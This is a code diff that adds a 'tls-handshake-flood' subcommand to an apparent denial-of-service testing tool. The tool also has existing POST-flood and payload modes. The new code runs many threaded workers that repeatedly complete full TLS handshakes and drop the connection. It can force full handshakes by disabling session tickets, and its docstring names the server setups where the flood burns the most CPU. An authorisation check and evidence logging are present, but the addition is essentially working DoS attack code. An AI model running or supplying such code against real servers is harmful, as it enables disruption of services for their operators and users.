@@ -512,6 +512,128 @@ def cmd_post_flood(a):
 
 
 # ----------------------------------------------------------------------------
+# TLS handshake flood
+# ----------------------------------------------------------------------------
+
+
+_TLS_ERR_SEEN = {"count": 0, "last": None}
+
+
+def cmd_tls_handshake_flood(a):
+    """Open TCP, complete full TLS handshake, disconnect immediately. Repeat at rate.
+
+    Pure asymmetric-crypto burn on the server. No HTTP is sent — completes
+    before any application-layer processing, so auth state is irrelevant.
+
+    Effective when:
+      - TLS terminates at origin (no CDN/scrubbing offload)
+      - Session resumption is disabled / not configured
+      - RSA key exchange still in use (vs ECDHE)
+      - No per-source connection-rate limit at the edge
+    """
+    confirm_authorisation(a.host, "tls-handshake-flood")
+    log, jsonl, _, _ = setup_evidence(a.host, "tls-handshake-flood", a.evidence_dir)
+    stop = threading.Event()
+    counters = {
+        "handshakes_ok": 0, "handshakes_failed": 0,
+        "tcp_errors": 0, "tls_errors": 0,
+        "handshake_time_sum": 0.0, "last_hs_ms": 0.0,
+    }
+    bucket = TokenBucket(a.rps)
+
+    def make_ctx():
+        ctx = ssl.create_default_context()
+        if a.insecure:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+        if a.no_resumption:
+            # Disable TLS session tickets (RFC 5077). Forces full handshake
+            # when the client offers no resumption material.
+            ctx.options |= ssl.OP_NO_TICKET
+        return ctx
+
+    def worker():
+        # One context per worker, optionally one per handshake.
+        ctx = make_ctx() if not a.new_context_per_handshake else None
+        while not stop.is_set():
+            bucket.wait()
+            if ctx is None:
+                use_ctx = make_ctx()
+            else:
+                use_ctx = ctx
+            sock = None
+            try:
+                t0 = time.monotonic()
+                sock = socket.create_connection((a.host, a.port), timeout=a.connect_timeout)
+                wrapped = use_ctx.wrap_socket(sock, server_hostname=a.host,
+                                              do_handshake_on_connect=True)
+                hs_time = time.monotonic() - t0
+                counters["handshakes_ok"] += 1
+                counters["handshake_time_sum"] += hs_time
+                counters["last_hs_ms"] = round(1000 * hs_time, 1)
+                try:
+                    wrapped.unwrap()
+                except (OSError, ssl.SSLError):
+                    pass
+                wrapped.close()
+            except (OSError, ssl.SSLError) as e:
+                counters["handshakes_failed"] += 1
+                if isinstance(e, ssl.SSLError):
+                    counters["tls_errors"] += 1
+                else:
+                    counters["tcp_errors"] += 1
+                msg = "{}: {}".format(type(e).__name__, e)
+                _TLS_ERR_SEEN["count"] += 1
+                if _TLS_ERR_SEEN["count"] == 1 or msg != _TLS_ERR_SEEN["last"] \
+                        or _TLS_ERR_SEEN["count"] % 100 == 0:
+                    logging.warning("handshake failed [%d so far] %s",
+                                    _TLS_ERR_SEEN["count"], msg)
+                    _TLS_ERR_SEEN["last"] = msg
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+
+    workers = []
+    for _ in range(a.workers):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+        workers.append(t)
+
+    def state():
+        n = counters["handshakes_ok"] or 1
+        return {
+            "handshakes_ok": counters["handshakes_ok"],
+            "handshakes_failed": counters["handshakes_failed"],
+            "tcp_errors": counters["tcp_errors"],
+            "tls_errors": counters["tls_errors"],
+            "avg_hs_ms": round(1000 * counters["handshake_time_sum"] / n, 1),
+            "last_hs_ms": counters["last_hs_ms"],
+        }
+
+    # Probe uses TLS=True regardless (we only test TLS endpoints).
+    probe_t = ProbeThread(a.host, a.port, True, a.probe_interval, jsonl, state, stop,
+                          insecure=a.insecure)
+    probe_t.start()
+
+    log.info("tls-handshake-flood started rps=%s workers=%s no_resumption=%s "
+             "new_ctx_per_hs=%s duration=%ds",
+             a.rps, a.workers, a.no_resumption, a.new_context_per_handshake, a.duration)
+    try:
+        time.sleep(a.duration)
+    except KeyboardInterrupt:
+        log.info("interrupted")
+    finally:
+        stop.set()
+        for t in workers:
+            t.join(timeout=2)
+        probe_t.join(timeout=2)
+        log.info("totals=%s evidence=%s", state(), jsonl)
+
+
+# ----------------------------------------------------------------------------
 # Algorithmic / payload subcommand
 # ----------------------------------------------------------------------------
 
@@ -610,6 +732,17 @@ def build_parser():
     sp.add_argument("--body-file")
     sp.add_argument("--content-type", default="application/json")
     sp.set_defaults(func=cmd_post_flood)
+
+    sp = sub.add_parser("tls-handshake-flood"); common(sp)
+    sp.add_argument("--rps", type=float, default=50,
+                    help="Target handshakes per second (start low, raise if needed)")
+    sp.add_argument("--workers", type=int, default=20)
+    sp.add_argument("--connect-timeout", type=float, default=10)
+    sp.add_argument("--no-resumption", action="store_true",
+                    help="Disable TLS session tickets (OP_NO_TICKET); forces full handshakes")
+    sp.add_argument("--new-context-per-handshake", action="store_true",
+                    help="Rebuild SSLContext per handshake; maximally expensive client-side too")
+    sp.set_defaults(func=cmd_tls_handshake_flood)
 
     sp = sub.add_parser("payload"); common(sp, with_path=True)
     sp.add_argument("--payload-file", required=True)
